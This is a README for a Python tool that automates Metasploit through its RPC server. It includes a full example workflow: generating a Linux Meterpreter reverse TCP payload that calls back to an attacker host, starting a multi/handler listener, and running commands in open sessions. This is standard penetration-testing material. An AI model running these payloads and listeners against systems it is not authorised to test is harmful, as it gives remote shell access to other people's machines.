# RyoTenkai: Metasploit RPC Automation Tool

**RyoTenkai** is a Python tool designed to automate tasks within the Metasploit Framework using the `pymetasploit3` library. It facilitates interaction with the Metasploit RPC server, offering functionalities such as running exploits, polling jobs and sessions, interacting with open sessions, and generating payloads using `msfvenom`. 

All outputs are provided in **structured JSON format**, which can be easily consumed by other tools like Ansible or any automation systems.

## Features

- **Start Metasploit RPC server**: Start the RPC server with user-specified credentials and port, and receive the response as JSON.
- **Run any Metasploit module**: Execute Metasploit modules with specified options and get both raw and filtered output in JSON format.
- **Poll active jobs**: View currently active jobs, returned as JSON.
- **Poll active sessions**: View currently active sessions as structured JSON output.
- **Access a session and run a command**: Interact with an active session, run a command, and retrieve the result as JSON.
- **Generate payloads using msfvenom**: Create payloads in various formats (e.g., ELF, EXE) for use with Metasploit modules, with JSON output indicating success or failure.

## Requirements

- Python 3.x
- Metasploit installed and configured
- `pymetasploit3` library for interacting with the Metasploit RPC server
- `configparser` for managing configuration settings
- `argparse` for parsing command-line arguments

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/your-repo/ryotenkai.git
    ```

2. Install the required dependencies:

    ```bash
    pip install pymetasploit3
    ```

3. Ensure that your Metasploit instance is running, and the Metasploit RPC server is enabled.

4. Configure the `config.ini` file (see below).

## Configuration

The tool reads the default configurations from a `config.ini` file. Here is an example `config.ini` file:

### Example `config.ini`:

```ini
[default]
msf_password = msfrpc
rpc_server = 10.192.0.3
rpc_port = 55559
rpc_ssl = True

[start_rpc]
rpc_user = msf
rpc_password = msfrpc
rpc_port = 55559

[run_module]
module = multi/handler
PAYLOAD = linux/x64/meterpreter/reverse_tcp
LHOST = 10.192.0.3
LPORT = 12344
ExitOnSession = false

[generate_payload]
format = elf
payload = linux/x64/meterpreter/reverse_tcp
lhost = 10.192.0.3
lport = 12344
output_file = test.sh

[get_jobs]
# No additional settings required as default values are reused

[get_sessions]
# No additional settings required as default values are reused

[run_command]
session_id = 4
session_command = ifconfig
```

## Usage

### General Structure

```bash
python ryotenkai.py <command> [options]
```

### Common Arguments

All commands share the following common arguments:

- `--msf-password`: The password for the Metasploit RPC server (default: `msfrpc`).
- `--rpc-server`: The Metasploit RPC server address (default: `127.0.0.1`).
- `--rpc-port`: The Metasploit RPC server port (default: `55552`).
- `--rpc-ssl`: Use SSL for RPC connection (default: `False`).

These arguments can be overridden via the command line or specified in `config.ini`.

### Available Commands

1. **Start the Metasploit RPC Server**:

    ```bash
    python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
    ```

    This starts the Metasploit RPC server on port `55559` with the password `msfrpc`. Output is in JSON format.

2. **Run a Metasploit Module**:

    ```bash
    python ryotenkai.py run_module <module> --option 'OPTION=VALUE' --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
    ```

    Example:

    ```bash
    python ryotenkai.py run_module exploit/multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344'
    ```

    This runs the `multi/handler` module with the specified payload options, returning the result in JSON.

3. **Poll Active Jobs**:

    ```bash
    python ryotenkai.py get_jobs --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
    ```

    This retrieves the list of active jobs in JSON format.

4. **Poll Active Sessions**:

    ```bash
    python ryotenkai.py get_sessions --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
    ```

    This retrieves the list of active sessions in JSON format.

5. **Run a Command in a Session**:

    ```bash
    python ryotenkai.py run_command 1 ifconfig --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
    ```

    This runs the `ifconfig` command in session `1` and returns the result in JSON.

6. **Generate a Payload**:

    ```bash
    python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
    ```

    This generates a Linux Meterpreter reverse TCP payload in ELF format, saving it to `/tmp/payload.sh`. Output is in JSON.

### Example Workflow

This example demonstrates the full workflow:

#### 1. Start the Metasploit RPC Server

```bash
python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
```

#### 2. Generate a Payload

```bash
python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh
```

#### 3. Run the Listener

```bash
python ryotenkai.py run_module multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344'
```

#### 4. Poll Jobs

```bash
python ryotenkai.py get_jobs
```

#### 5. Poll Sessions

```bash
python ryotenkai.py get_sessions
```

#### 6. Run a Command on an Active Session

```bash
python ryotenkai.py run_command 1 ifconfig
```

## JSON Outputs

All core functionalities return outputs in structured JSON format. This ensures easy integration with automation tools like Ansible.

### Example JSON Output for Generating a Payload:

```json
{
    "status": "success",
    "message": "Payload saved to /tmp/payload.sh",
    "details": {
        "format": "elf",
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "lhost": "10.192.0.3",
        "lport": "12344",
        "output_file": "/tmp/payload.sh"
    }
}
```

### Example JSON Output for Running a Command in a Session:

```json
{
    "session_id": "1",
    "command": "ifconfig",
    "result": "eth0      Link encap:Ethernet  HWaddr 00:50:56:aa:bb:cc"
}
```

## Logging

The script uses Python's logging module to provide detailed information about the operations being performed. The log level is set to `INFO` by default but can be adjusted within the script for more verbose output.

## License

This project is licensed under the MIT License. See the LICENSE file for more information.
